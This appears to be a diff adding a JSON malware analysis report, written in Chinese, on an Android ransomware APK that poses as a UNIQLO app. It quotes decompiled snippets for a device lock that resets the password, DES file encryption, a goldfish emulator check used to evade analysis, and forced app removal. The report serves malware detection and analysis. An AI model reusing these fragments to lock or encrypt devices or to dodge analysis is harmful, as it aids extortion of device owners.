@@ -1,0 +1,166 @@
+{
+  "APK信息": {
+    "文件名": "498db597de24ff15130d8b7fab11de8188a5044d7a8fe78cf5f5e0c570e681ab.apk",
+    "sha256": "498db597de24ff15130d8b7fab11de8188a5044d7a8fe78cf5f5e0c570e681ab",
+    "包名": "com.postman.search.online",
+    "应用名": "UNIQLO",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 313.0
+  },
+  "行为列表": [
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow",
+              "resetPassword"
+            ]
+          }
+        },
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\postman\\search\\online\\tools\\JKits;",
+          "method_signature": "if(!manager.isAdminActive(mAdminName)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "manager.resetPassword(code, 0); manager.lockNow();",
+          "malicious_code_snippet_context": "manager.resetPassword(code, 0); manager.lockNow();",
+          "behavior_description": "该方法通过DevicePolicyManager调用resetPassword()重置设备锁屏密码为攻击者指定的密码，随后调用lockNow()立即锁定屏幕，使用户无法正常使用设备，实现勒索软件的设备锁屏行为。数据流向：外部传入的code参数(攻击者控制的密码)→DevicePolicyManager.resetPassword()设置设备密码 + DevicePolicyManager.lockNow()锁定屏幕",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\postman\\search\\online\\tools\\JUtils;",
+          "method_signature": "encrypt(byte[] arrB)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.encryptCipher = Cipher.getInstance(\"DES\");\nthis.encryptCipher.init(1, key);\nreturn this.encryptCipher.doFinal(arrB);",
+          "malicious_code_snippet_context": "          this.decryptCipher = null;\n          Security.addProvider(new SunJCE());\n          Key key = getKey(strKey.getBytes());\n>>>         this.encryptCipher = Cipher.getInstance(\"DES\");\n>>>         this.encryptCipher.init(1, key);\n>>>         this.decryptCipher = Cipher.getInstance(\"DES\");\n          this.decryptCipher.init(2, key);\n      }\n  ",
+          "behavior_description": "该代码使用DES算法对传入的字节数组进行加密。在已确认的恶意样本中，JUtils类作为勒索软件的加密工具类，通过encryptCipher.init(1, key)初始化加密器（模式1=ENCRYPT_MODE），再调用encryptCipher.doFinal(arrB)对文件内容字节进行DES加密，加密后的数据通过byteArr2HexStr转为十六进制字符串存储，实现文件加密勒索的核心功能。数据流向：文件数据(arrB参数) → DES加密(doFinal) → 加密后数据返回。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "anti_detection",
+      "中文名": "反检测/对抗技术",
+      "MITRE": "T1426",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "anti_emulator",
+          "中文名": "反模拟器",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "goldfish"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\postman\\search\\online\\tools\\JRunCheck;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "anti_detection",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "private static String[] known_qemu_drivers = {\"goldfish\"};\npublic boolean isDeviceRooted(Context context) {\n    return checkRootMethod1() || checkRootMethod2() || checkRootMethod3() || isEmu().booleanValue();\n}\nprivate static Boolean isEmu() {\n    File driver_file = new File(\"/proc/tty/drivers\");\n    if (driver_file.exists() && driver_file.canRead()) {\n        byte[] data = new byte[(int) driver_file.length()];\n    }\n}",
+          "malicious_code_snippet_context": "  \n  /* loaded from: classes.dex */\n  public class JRunCheck {\n>>>     private static String[] known_qemu_drivers = {\"goldfish\"};\n>>> \n>>>     public boolean isDeviceRooted(Context context) {\n>>>         return checkRootMethod1() || checkRootMethod2() || checkRootMethod3() || isEmu().booleanValue();\n>>>     }\n>>> \n>>>     private static Boolean isEmu() {\n>>>         File driver_file = new File(\"/proc/tty/drivers\");\n>>>         if (driver_file.exists() && driver_file.canRead()) {\n>>>             byte[] data = new byte[(int) driver_file.length()];\n              try {\n                  InputStream inStream = new FileInputStream(driver_file);\n                  inStream.read(data);",
+          "behavior_description": "代码通过读取 /proc/tty/drivers 文件并检查是否包含 QEMU 模拟器特征驱动（如 goldfish），判断当前运行环境是否为模拟器。同时 isDeviceRooted 方法将模拟器检测与 root 检测组合使用，用于在模拟器/分析环境中逃避安全检测，属于恶意软件常见的反分析对抗行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        },
+        {
+          "子行为": "silent_uninstall",
+          "中文名": "静默卸载",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.DELETE"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\postman\\search\\online\\tools\\JKits;",
+          "method_signature": "removeAPK(Context con, String packageName)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "Uri uri = Uri.parse(\"package:\" + packageName);\nIntent intent = new Intent(\"android.intent.action.DELETE\", uri);\nintent.setFlags(268435456);\ncon.startActivity(intent);",
+          "malicious_code_snippet_context": "  \n      public static void removeAPK(Context con, String packageName) {\n          try {\n>>>             Uri uri = Uri.parse(\"package:\" + packageName);\n>>>             Intent intent = new Intent(\"android.intent.action.DELETE\", uri);\n>>>             intent.setFlags(268435456);\n>>>             con.startActivity(intent);\n          } catch (Exception e) {\n              e.printStackTrace();\n          }",
+          "behavior_description": "该方法接收外部传入的包名参数 packageName，构造 package: URI 并创建 ACTION_DELETE Intent，通过 startActivity 调起系统卸载界面尝试卸载指定应用。在恶意样本上下文中，此方法通常用于卸载安全软件、竞争恶意软件或其他防护类应用，以削弱设备防护能力。虽然 ACTION_DELETE 会弹出系统确认框（非完全静默），但恶意软件常配合辅助功能服务自动点击确认或通过社会工程学诱导用户操作，数据流向为：参数传入 packageName → 构造 package URI → startActivity 触发卸载流程。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
